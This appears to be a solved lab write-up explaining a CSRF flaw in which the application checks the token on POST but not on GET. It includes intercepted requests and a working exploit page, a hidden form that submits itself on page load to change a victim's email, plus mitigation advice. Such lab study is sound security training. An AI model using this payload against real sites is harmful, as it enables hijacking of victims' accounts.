# Lab: CSRF where token validation depends on request method

**Difficulty:** Practitioner  
**Vulnerability:** Cross-Site Request Forgery (CSRF)  
**Status:** Solved ✅

## 1. Lab Overview

This lab contains a CSRF vulnerability in the email change functionality. The application attempts to prevent CSRF attacks using a token, but its validation depends on the HTTP request method.

**Objective:** Host an HTML page on the Exploit Server that performs a CSRF attack to change the victim's email address.

## 2. Analyzing the Original Request

After logging in with the credentials `wiener:peter`, I used the email change functionality and intercepted the request using Burp Suite.

The application sent a `POST` request containing two parameters:

```http
POST /my-account/change-email HTTP/2
Content-Type: application/x-www-form-urlencoded

email=wiener%40gmail.com&csrf=e1g6vqhurT7e4UCtmsvMGM2lZFMvaE2f
```

The parameters were:

- `email`: The new email address.
- `csrf`: The CSRF token used to protect the request.

Since the request included a CSRF token, I investigated whether the endpoint accepted other HTTP methods.

## 3. Checking Supported HTTP Methods

I sent an `OPTIONS` request to inspect the HTTP methods supported by the endpoint. I discovered that `GET` was also accepted.

I then tried sending a `GET` request:

```http
GET /my-account/change-email HTTP/2
```

The server responded with the error:

```text
Missing parameter email
```

This indicated that the application expected an email parameter.

## 4. Bypassing CSRF Token Validation

Initially, I had included the email parameter in the request body. After receiving the error, I moved the parameter into the URL query string:

```http
GET /my-account/change-email?email=wiener%40gmail.com HTTP/2
```

This time, the request succeeded.

I tested the vulnerability by changing the email address to a different value and checking my account page. The email address had actually changed, confirming that the server processed the request without requiring a CSRF token.

**Key finding:** The application enforced CSRF token validation for the `POST` request but failed to enforce it for the `GET` request. By changing the HTTP method, I was able to bypass the token validation.

## 5. Creating the CSRF Exploit

After confirming the vulnerability, I created the following HTML page on the Exploit Server:

```html
<form action="https://0a6b00fa04a38be980b2035600d300fe.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="fateh123@gmail.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

Since the form does not specify a `method` attribute, it defaults to `GET`.

When the page loads, JavaScript automatically submits the form, sending a request to the vulnerable endpoint with the new email address as a query parameter.

If the victim is authenticated and the browser includes their session cookie with the request, the application may process the email change using the victim's session.

## 6. Result

I delivered the exploit through the Exploit Server, and the lab was successfully completed.

### Key Takeaways

- The presence of a CSRF token does not automatically mean an application is protected against CSRF attacks.
- CSRF validation must be enforced consistently across all relevant HTTP methods.
- `GET` requests should not be used to perform state-changing operations.
- Checking supported HTTP methods and testing their behavior can help identify security vulnerabilities.

### Recommended Mitigation

Applications should use appropriate HTTP methods for state-changing operations, reject state-changing `GET` requests, and enforce server-side CSRF token validation on every relevant request. Additional protections, such as appropriate `SameSite` cookie settings, can provide another layer of defense.
